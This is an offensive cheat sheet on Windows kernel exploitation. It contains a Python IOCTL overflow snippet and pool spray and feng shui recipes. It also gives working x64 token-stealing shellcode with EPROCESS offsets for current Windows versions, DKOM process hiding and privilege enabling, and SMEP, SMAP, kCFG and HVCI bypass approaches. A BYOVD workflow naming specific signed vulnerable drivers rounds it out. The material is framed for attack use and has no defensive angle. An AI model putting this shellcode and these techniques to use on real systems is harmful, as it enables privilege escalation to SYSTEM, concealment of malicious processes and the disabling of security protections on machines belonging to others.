# Windows Kernel Exploitation

## Attack Surface

### Win32k (GUI Subsystem)
```
# Largest kernel attack surface — handles window management, GDI
# Reachable from user-mode via NtUser*/NtGdi* syscalls
# Common bugs: UAF on window/menu objects, type confusion in callbacks
# User-mode callbacks: kernel calls back to user-mode during syscall
#   → attacker can modify kernel state during callback window
```

### NTFS / Filter Drivers
```
# File system drivers parse complex structures
# Malformed NTFS images, reparse points, EAs (Extended Attributes)
# Filter drivers (AV, EDR) add attack surface on file operations
```

### Network Stack (AFD, tcpip.sys, HTTP.sys)
```
# AFD.sys: Ancillary Function Driver (Winsock kernel component)
# tcpip.sys: TCP/IP stack
# HTTP.sys: Kernel-mode HTTP server (IIS)
# Reachable remotely or from low-privilege local
```

### IOCTLs (Third-Party Drivers)
```python
# Enumerate driver IOCTLs
# Many third-party drivers have trivial vulnerabilities
# BYOVD (Bring Your Own Vulnerable Driver): load signed vulnerable driver

import ctypes
kernel32 = ctypes.WinDLL('kernel32')

# Open device
handle = kernel32.CreateFileW(
    "\\\\.\\VulnDriver", 0xC0000000, 0, None, 3, 0, None)

# Send IOCTL
in_buf = b'A' * 0x1000  # overflow
out_buf = (ctypes.c_char * 0x100)()
bytes_returned = ctypes.c_ulong()
kernel32.DeviceIoControl(
    handle, 0x222003,  # IOCTL code
    in_buf, len(in_buf),
    out_buf, len(out_buf),
    ctypes.byref(bytes_returned), None)
```

## Pool Exploitation

### Pool Overflow (Windows Pool Allocator)
```
# Windows kernel pool: NonPagedPool, PagedPool, NonPagedPoolNx
# Pool chunks have headers: _POOL_HEADER (0x10 bytes on x64)
# Overflow into adjacent pool chunk → corrupt header or object data

# Strategy:
# 1. Spray pool with objects of target size (fill pool page)
# 2. Create holes (free specific objects)
# 3. Allocate vulnerable object into hole
# 4. Trigger overflow into adjacent controlled object
# 5. Corrupt function pointer / object data in adjacent object
```

### Pool Spray Techniques
```c
// Named pipes (NonPagedPoolNx, variable size)
CreateNamedPipe → NtFsControlFile(FSCTL_PIPE_ASSIGN_EVENT)
// Size controllable via pipe attributes

// IoCompletionReserve (NonPagedPoolNx, 0x60 bytes)
NtAllocateReserveObject(handle, NULL, 1);  // Type 1 = IoCompletion

// Events (NonPagedPoolNx, 0x40 bytes)
CreateEvent(NULL, FALSE, FALSE, NULL);

// Large pool allocations (PagedPool, arbitrary size)
NtCreateKey with large name → controllable PagedPool allocation
```

### Pool Feng Shui
```
# Goal: deterministic pool layout for reliable exploitation
# 1. Exhaust current pool page (spray objects)
# 2. Trigger new page allocation
# 3. In new page: allocate A, B, A, B, A, B pattern
# 4. Free all B objects → holes between A objects
# 5. Vulnerable allocation fills a hole → adjacent to A (your controlled object)
# 6. Overflow from vulnerable into A → corrupt A's data
```

## Token Stealing (Kernel Exploit Payload)

### Assembly Payload (x64)
```nasm
; Token stealing shellcode for Windows kernel
; Copies SYSTEM token to current process

[BITS 64]

; Get current EPROCESS via KTHREAD
mov rax, [gs:0x188]        ; KTHREAD (current thread)
mov rax, [rax+0x220]       ; EPROCESS (ApcState.Process)
mov rcx, rax               ; Save current EPROCESS

; Walk ActiveProcessLinks to find SYSTEM (PID 4)
mov rdx, [rax+0x448]       ; ActiveProcessLinks.Flink
find_system:
    mov rax, [rdx-0x8]     ; UniqueProcessId (offset - 8 from links)
    cmp rax, 4             ; SYSTEM PID
    je found
    mov rdx, [rdx]         ; Next entry
    jmp find_system

found:
    ; rdx points to ActiveProcessLinks of SYSTEM process
    mov rax, [rdx+0x70]    ; Token (offset from ActiveProcessLinks)
    and al, 0xf0           ; Clear RefCnt low nibble
    mov [rcx+0x4b8], rax   ; Overwrite current process token

    ; Return cleanly (context-dependent)
    xor rax, rax
    ret
```

### Offsets by Version
```
# EPROCESS offsets (x64):
# Field              Win10 21H2   Win11 22H2   Server 2022
# UniqueProcessId    0x440        0x440        0x440
# ActiveProcessLinks 0x448        0x448        0x448
# Token              0x4b8        0x4b8        0x4b8
# ImageFileName      0x5a8        0x5a8        0x5a8

# KTHREAD offsets:
# ApcState.Process   0x220        0x220        0x220
# PreviousMode       0x232        0x232        0x232
```

## DKOM (Direct Kernel Object Manipulation)

### Process Hiding
```c
// Unlink EPROCESS from ActiveProcessLinks
// Process still runs but invisible to Task Manager / EnumProcesses

// Flink->Blink = Blink
// Blink->Flink = Flink
// (Standard doubly-linked list unlink)
```

### Privilege Escalation via DKOM
```c
// Modify token privileges directly in kernel memory
// _TOKEN structure:
// +0x40: Privileges (_SEP_TOKEN_PRIVILEGES)
//   +0x00: Present (bitmap of present privileges)
//   +0x08: Enabled (bitmap of enabled privileges)
//   +0x10: EnabledByDefault

// Set all privileges enabled:
// Write 0xFFFFFFFFFFFFFFFF to Enabled field
```

## Mitigation Bypass

### SMEP Bypass
```
# SMEP: Supervisor Mode Execution Prevention
# Kernel cannot execute user-mode pages
# Bypass: kernel ROP chain (all gadgets from kernel/driver code)
# Or: flip CR4.SMEP bit via ROP (mov cr4, rax gadget)
#   → then execute user-mode shellcode

# Find gadget: mov cr4, rax; ret (or equivalent)
# Set RAX = current_cr4 & ~(1<<20)  # clear SMEP bit
```

### SMAP Bypass
```
# SMAP: Supervisor Mode Access Prevention
# Kernel cannot read/write user-mode pages
# Bypass: clac instruction (clear AC flag) or stac in ROP
# Or: copy data to kernel address first (kernel pool spray)
```

### kCFG (Kernel CFG)
```
# Kernel Control Flow Guard: validates indirect calls in kernel
# Bypasses:
# 1. Data-only attacks (modify data, not code flow)
# 2. Corrupt dispatch table entries (valid targets)
# 3. Use valid-but-useful call targets
# 4. Return-oriented (kCFG doesn't protect returns)
```

### VBS / HVCI (Virtualization-Based Security)
```
# HVCI: Hypervisor-enforced Code Integrity
# Prevents: unsigned kernel code execution, modifying code pages
# Even kernel can't allocate RWX or modify code

# Bypasses:
# 1. Data-only attacks (token stealing without code execution)
# 2. Abuse existing signed code (ROP within signed modules)
# 3. Attack the hypervisor itself (extremely difficult)
# 4. Disable VBS via firmware/boot attack (physical access)
```

## BYOVD (Bring Your Own Vulnerable Driver)

```python
# Load a legitimately signed but vulnerable driver
# Use its vulnerability to get kernel read/write
# Common targets: old GPU drivers, hardware monitoring tools

# Steps:
# 1. Find signed driver with known vuln (e.g., arbitrary MSR read/write)
# 2. Load driver: sc create / NtLoadDriver
# 3. Exploit driver vuln to get kernel R/W primitive
# 4. Token steal or disable protections

# Known vulnerable drivers (examples):
# - RTCore64.sys (MSI Afterburner) — arbitrary physical memory R/W
# - dbutil_2_3.sys (Dell) — arbitrary kernel R/W via IOCTL
# - ene.sys (ENE Technology) — physical memory access
# - gdrv.sys (Gigabyte) — arbitrary memcpy in kernel
```

## Tools

| Tool | Purpose |
|------|---------|
| WinDbg (kernel mode) | Primary kernel debugger |
| VirtualKD-Redux | Fast VM kernel debugging |
| HyperDbg | Hypervisor-level debugger |
| NtObjectManager (PS) | Explore kernel objects |
| PoolTag lookup | Identify pool allocations by tag |
| Verifier.exe | Driver verifier (catch pool corruption) |
| !pool / !poolfind | WinDbg pool analysis |
| kdmapper | Manual map driver (bypass DSE) |

## Debugging Setup

```
# VM kernel debugging (VirtualBox/VMware)
bcdedit /debug on
bcdedit /dbgsettings net hostip:<host> port:50000 key:1.2.3.4

# WinDbg kernel commands
!process 0 0                    # List all processes
!process <addr> 7               # Full process details
dt nt!_EPROCESS <addr>          # Dump EPROCESS
dt nt!_TOKEN <addr>             # Dump token
!pool <addr>                    # Pool chunk info
!poolused 2                     # Pool usage by tag
ed <addr> <value>               # Edit memory (dword)
eq <addr> <value>               # Edit memory (qword)

# Find SYSTEM EPROCESS
!process 0 0 System
# → gives EPROCESS address for PID 4
```
